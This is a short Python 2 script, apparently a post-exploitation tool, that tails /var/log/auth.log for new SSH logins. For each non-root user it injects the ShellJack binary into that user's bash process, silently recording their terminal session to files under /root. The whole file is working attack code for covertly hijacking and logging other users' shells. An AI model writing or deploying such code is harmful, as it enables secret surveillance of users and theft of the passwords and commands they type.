#!/usr/bin/env python

"""
    autojack.py

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
import re
import subprocess
import time

# Get ShellJack from https://github.com/emptymonkey/shelljack.
SHELLJACK_BINARY = "/root/sj"
LOGFILE = "/root/.local/sj.log.%s.%d"  # Pattern: sj.log.user.timestamp

# Watch the auth.log for "session open for user X" entries.
SESSION_OPEN_REGEX = re.compile("^\w{3} [ :0-9]{11} [A-Za-z0-9]+ sshd\[([0-9]+)\]: pam_unix\(sshd:session\): session opened for user ([a-z0-9.-]+) by \(uid=[0-9]+\)$")

f = open("/var/log/auth.log", 'r')
f.seek(0, 2)  # Seek to the end of the file.
while True:
    line = f.readline()
    m = re.match(SESSION_OPEN_REGEX, line)
    if line and m:
        # Do not log what root does, s/he's the one who set this up!
        if m.group(2) == "root":
            continue

        p = subprocess.Popen(["pgrep", "-P", m.group(1), "-l"], stdout=subprocess.PIPE)
        stdout, stderr = p.communicate()
        out = stdout.split("\n")

        i = 0
        while i < len(out):
            child_process = out[i].split(' ')
            if not out[i] or len(child_process) != 2:
                i += 1
                continue
            if child_process[1] == "bash":
                print "Found a new bash process with PID %s for user %s! Injecting shelljack... " % (child_process[0], m.group(2)),
                subprocess.call([SHELLJACK_BINARY, "-f", LOGFILE % (m.group(2), int(time.time())), child_process[0]])
                print "Done!"
                break
            # An additional child sshd process may contain the bash reference.
            elif child_process[1] == "sshd":
                p2 = subprocess.Popen(["pgrep", "-P", child_process[0], "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout2, stderr2 = p2.communicate()
                out.extend(stdout2.split('\n'))
            i += 1

    elif not line:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            print "\rBye!"
            break

